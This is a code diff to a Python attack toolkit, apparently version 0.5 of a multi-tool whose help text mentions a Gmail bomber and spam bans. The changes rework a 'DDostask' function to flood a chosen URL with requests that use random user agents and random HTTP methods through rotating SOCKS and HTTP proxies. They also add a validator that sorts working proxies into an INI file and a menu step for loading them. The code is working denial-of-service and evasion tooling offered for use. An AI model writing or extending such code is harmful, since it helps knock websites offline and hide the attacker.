@@ -105,14 +105,20 @@ def load_proxies(file_path: str) -> dict:
         return False
 
 def get_random_proxy() -> dict:
-    """Возвращает случайный прокси в формате для requests"""
     if not PROXIES_LIST:
         return None
     
     proxy_str = random.choice(PROXIES_LIST)
-    parsed = urlparse(proxy_str)
     
-    # Форматируем для requests
+    # Handle SOCKS proxies
+    if proxy_str.startswith('socks5://') or proxy_str.startswith('socks4://'):
+        return {
+            'http': proxy_str,
+            'https': proxy_str
+        }
+    
+    # Handle HTTP/HTTPS proxies
+    parsed = urlparse(proxy_str)
     return {
         'http': f"{parsed.scheme}://{parsed.netloc}",
         'https': f"{parsed.scheme}://{parsed.netloc}"
@@ -158,6 +164,83 @@ def get_location(url, proxy_str):
     except Exception as e:
         print(f"{Fore.RED}Proxy error: {type(e).__name__} - {str(e)}{Style.RESET_ALL}")
     return None
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+def validate_proxies_from_json(json_path, output_ini="proxycfg.ini"):
+    print(f"{Fore.CYAN}\nValidating proxies from: {json_path}")
+    try:
+        with open(json_path, 'r', encoding='utf-8') as f:
+            proxies_data = json.load(f)
+        
+        working_proxies = []
+        
+        for item in proxies_data:
+            proxy_url = item.get('proxy')
+            if not proxy_url:
+                continue
+                
+            print(f"Testing proxy: {proxy_url}")
+            start_time = time.time()
+            try:
+                response = requests.get(
+                    'https://2ip.ru', 
+                    proxies={'http': proxy_url, 'https': proxy_url},
+                    timeout=10,
+                    headers=headers
+                )
+                if response.status_code == 200:
+                    end_time = time.time()
+                    time_taken = end_time - start_time
+                    print(f"  {Fore.GREEN}OK! Time: {time_taken:.2f}s{Style.RESET_ALL}")
+                    
+                    # Extract country code if available
+                    country = item.get('geolocation', {}).get('country', 'N/A')
+                    working_proxies.append({
+                        'url': proxy_url,
+                        'time': time_taken,
+                        'country': country
+                    })
+                else:
+                    print(f"  {Fore.RED}Failed: HTTP {response.status_code}{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"  {Fore.RED}Error: {str(e)}{Style.RESET_ALL}")
+        
+        # Sort by response time
+        working_proxies.sort(key=lambda x: x['time'])
+        
+        # Save to INI
+        config = configparser.ConfigParser()
+        for i, proxy in enumerate(working_proxies, 1):
+            section = f"Proxy{i}"
+            config[section] = {
+                'name': f"{proxy['country']} ({proxy['time']:.2f}s)",
+                'url': proxy['url']
+            }
+        
+        with open(output_ini, 'w') as configfile:
+            config.write(configfile)
+            
+        print(f"{Fore.GREEN}Saved {len(working_proxies)} working proxies to {output_ini}{Style.RESET_ALL}")
+        return True
+        
+    except Exception as e:
+        print(f"{Fore.RED}Validation error: {e}{Style.RESET_ALL}")
+        return False
 
 
 ################################################################################################
@@ -1787,22 +1870,42 @@ def run_async_task(async_func, *args):
 
 
 def DDostask(ddtarget, ddmin, ddmax, task_id, proxy_dict=None):
-    delay = random.randint(ddmin, ddmax)
-    url = ddtarget
-    proxy_dict = get_random_proxy()
-
-    # DDOS:
-    GETsponse = requests.get(url=url, headers=headers, proxies=proxy_dict)
-    time.sleep(delay)
-    dg = GETsponse.status_code
-    print(dg)
-
-
-    # POST DDOS
-    POSTsponse = requests.post(url=url, headers=headers, proxies=proxy_dict)
-    time.sleep(delay)
-    pg = POSTsponse.status_code
-    print(pg)
+    try:
+        # Generate random headers
+        user_agent = fake_useragent.UserAgent().random
+        headers = {
+            'User-Agent': user_agent,
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Connection': 'keep-alive',
+        }
+        
+        # Random HTTP method
+        methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE']
+        method = random.choice(methods)
+        
+        # Execute request
+        start_time = time.time()
+        if method == 'GET':
+            response = requests.get(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
+        elif method == 'POST':
+            response = requests.post(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
+        elif method == 'HEAD':
+            response = requests.head(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
+        elif method == 'OPTIONS':
+            response = requests.options(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
+        elif method == 'PUT':
+            response = requests.put(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
+        elif method == 'DELETE':
+            response = requests.delete(url=ddtarget, headers=headers, proxies=proxy_dict, timeout=10)
+        
+        delay = random.uniform(ddmin, ddmax)
+        time.sleep(delay)
+        
+        print(f"Task {task_id}: {method} {ddtarget} -> {response.status_code} in {time.time()-start_time:.2f}s")
+    
+    except Exception as e:
+        print(f"Task {task_id}: Error - {str(e)}")
 
 
 
@@ -2089,12 +2192,27 @@ async def main():
         elif choice == "3":
             clear_console()
             print(Fore.WHITE + logo)
-            proxy_file = input(Fore.WHITE + "\nEnter path to proxy configuration file: ")
-            if load_proxies(proxy_file):
-                print(f"{Fore.GREEN}\nSUCCESS: Proxies loaded")
-                PROXIES_LOADED = True
-            else:
-                print(f"{Fore.RED}\nERROR: Failed to load proxies")
+            proxy_choice = input(Fore.WHITE + 
+                "\n" + "-"*50 +
+                "\nPROXY SETUP\n" +
+                "-"*50 +
+                "\n1. Load proxies from INI\n" +
+                "2. Validate proxies from JSON\n" +
+                "-"*50 +
+                "\nSelect option: "
+            )
+            
+            if proxy_choice == "1":
+                proxy_file = input("\nEnter path to proxy configuration file: ")
+                if load_proxies(proxy_file):
+                    print(f"{Fore.GREEN}Proxies loaded successfully!{Style.RESET_ALL}")
+                else:
+                    print(f"{Fore.RED}Failed to load proxies{Style.RESET_ALL}")
+                    
+            elif proxy_choice == "2":
+                json_path = input("\nEnter path to JSON file with proxies: ")
+                output_ini = input("Enter output INI file name (default: proxycfg.ini): ") or "proxycfg.ini"
+                validate_proxies_from_json(json_path, output_ini)
         
 
         elif choice == "4":
@@ -2275,7 +2393,7 @@ async def main():
             clear_console()
             print(Fore.WHITE + logo)
             print("Contact with me\nTelegram: @absotry\nEmail: 5656@tutamail.com\n")
-            print("Version: 0.3")
+            print("Version: 0.5")
             helpme56 = input(
                 "\n============================\n"
                 "HELP MENU:\n" 
@@ -2386,6 +2504,8 @@ For what i  can het ban?
 after +- 7 attempts accounts get spamm ban. First ban - 24hours (IPban, device ban, account ban)
 
 3. For abuse gmailbomber
+
+4. For DDos
 
 For get smaller chanse for ban
 
